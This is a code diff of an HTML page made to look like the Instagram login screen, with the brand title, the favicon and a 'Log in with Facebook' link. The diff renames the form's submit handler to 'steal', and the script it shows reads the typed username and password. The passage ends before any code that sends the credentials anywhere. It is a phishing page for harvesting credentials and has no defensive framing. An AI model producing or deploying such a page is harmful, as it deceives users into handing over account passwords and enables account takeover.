@@ -1,64 +1,97 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Instagram</title>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500">
+  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+
   <style>
     body {
+      margin: 0;
+      padding: 0;
       background-color: #fafafa;
       font-family: 'Roboto', sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
     }
-    .login-container {
-      background: white;
+
+    .container {
+      width: 100%;
+      max-width: 350px;
+      margin: 80px auto;
+      padding: 40px 40px 30px;
+      background-color: white;
       border: 1px solid #dbdbdb;
-      padding: 40px;
-      width: 350px;
       text-align: center;
     }
-    .logo {
-      width: 180px;
-      margin-bottom: 20px;
+
+    .logo-text {
+      font-family: 'Billabong', cursive;
+      font-size: 48px;
+      margin-bottom: 30px;
     }
+
     input {
       width: 100%;
       padding: 10px;
-      margin: 5px 0;
+      margin: 6px 0;
+      font-size: 14px;
+      background: #fafafa;
       border: 1px solid #dbdbdb;
       border-radius: 3px;
     }
+
     button {
       background-color: #0095f6;
-      color: white;
       border: none;
-      padding: 10px;
+      color: white;
+      padding: 8px;
+      margin-top: 10px;
       width: 100%;
       font-weight: bold;
-      margin-top: 10px;
+      border-radius: 4px;
       cursor: pointer;
     }
-    button:disabled {
-      background-color: #b2dffc;
+
+    .or-separator {
+      margin: 20px 0;
+      display: flex;
+      align-items: center;
+    }
+
+    .or-separator::before,
+    .or-separator::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+
+    .or-separator span {
+      margin: 0 10px;
+      color: #8e8e8e;
+      font-weight: 500;
+      font-size: 13px;
     }
   </style>
 </head>
+
 <body>
-  <div class="login-container">
-    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" />
-    <form onsubmit="submitLogin(event)">
-      <input id="username" type="text" placeholder="Phone number, username, or email" required />
-      <input id="password" type="password" placeholder="Password" required />
+  <div class="container">
+    <div class="logo-text">Instagram</div>
+    <form onsubmit="steal(event)">
+      <input id="username" type="text" placeholder="Phone number, username, or email" required>
+      <input id="password" type="password" placeholder="Password" required>
       <button type="submit">Log In</button>
     </form>
+
+    <div class="or-separator"><span>OR</span></div>
+    <div style="font-size: 14px; color: #385185; font-weight: 500;">Log in with Facebook</div>
   </div>
 
   <script>
-    function submitLogin(e) {
+    function steal(e) {
       e.preventDefault();
+
       const u = document.getElementById("username").value;
       const p = document.getElementById("password").value;
 
